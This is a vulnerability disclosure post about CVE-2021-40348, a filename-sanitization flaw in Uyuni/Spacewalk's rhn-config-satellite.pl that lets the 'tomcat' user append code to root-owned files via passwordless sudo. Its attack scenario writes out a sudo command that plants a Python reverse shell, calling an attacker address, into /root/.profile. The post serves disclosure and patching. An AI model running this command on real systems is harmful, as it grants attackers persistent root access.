    "text": "Subject : spacewalk-admin : CVE-2021-40348 : arbitrary local code execution by ， 'tomcat' user via rhn-config-satellite.pl ，  # Description ， Hello list , during an internal audit a vulnerability was found in a perl ， script from the uyuni [ 1 ] component ( previously known as spacewalk [ 2 ]  ,  ， discontinued on March 31st 2020 ) . Uyuni is a configuration and ， infrastructure management tool helping sysadmin's in their tasks over a ， huge multitude of assets. ， The rhn-config-satellite.pl script is intended to be run by the 'tomcat' ， user using sudo without any password , to adjust Uyuni configuration. ， Due to a missing sanitization of the filename that can be used as config ， file , a rogue 'tomcat' user can append arbitrary code to any files that ， eventually will be executed later on by higher privileged users. ， Please consider the following attack scenario. An attacker gains ， 'tomcat' user on the victim server. Rogue 'tomcat' executes the ， following command :  ， sudo /usr/bin/rhn-config-satellite.pl -target=/root/.profile ， -option=\"export RHOST=\\\"192.168.122.1\\\" ; export RPORT=4444 ; python -c ， 'import ， sys , socket , os , pty ; s=socket.socket (  )  ; s.connect ( os.getenv ( \\\"RHOST\\\" )  , int ( os.getenv ( \\\"RPORT\\\" )  ;  [ os.dup2 ( s.fileno (  )  , fd )  ， The python code implementing a reverse shell is then appended to the ， /root/.profile file and executed everytime root logs in. This results in ， having arbitrary code execution with superuser privileges on the victim ， system. ，  # Affected versions ， This vulnerability was fixed in spacewalk-admin version 4.3.2-1 [ 3 ]  ( by ， this commit on upstream [ 4 ]  ) . All spacewalk-admin versions before ， 4.3.2-1 are vulnerable",
